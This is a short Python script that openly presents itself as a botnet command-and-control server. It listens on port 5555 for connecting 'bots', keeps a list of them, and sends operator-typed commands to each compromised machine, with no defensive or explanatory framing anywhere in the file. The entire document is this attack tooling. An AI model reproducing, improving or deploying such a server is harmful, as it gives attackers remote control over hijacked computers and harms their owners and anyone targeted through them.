import socket
import threading

# Server Configuration
HOST = '0.0.0.0'  # Listen on all interfaces
PORT = 5555       # Port for C2 Server

clients = []  # List to store connected bots

def handle_client(client_socket, address):
    print(f"[+] Bot connected: {address}")
    clients.append(client_socket)
    
    try:
        while True:
            command = input("C2 Command > ")  # Input command from operator
            if command.lower() == "exit":
                client_socket.send(b"disconnect")
                clients.remove(client_socket)
                client_socket.close()
                break
            client_socket.send(command.encode())  # Send command to bot
    except Exception as e:
        print(f"[-] Error with bot {address}: {e}")
        clients.remove(client_socket)
        client_socket.close()

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"[+] C2 Server started on {HOST}:{PORT}")
    
    while True:
        client_socket, address = server.accept()
        threading.Thread(target=handle_client, args=(client_socket, address)).start()

if __name__ == "__main__":
    main()
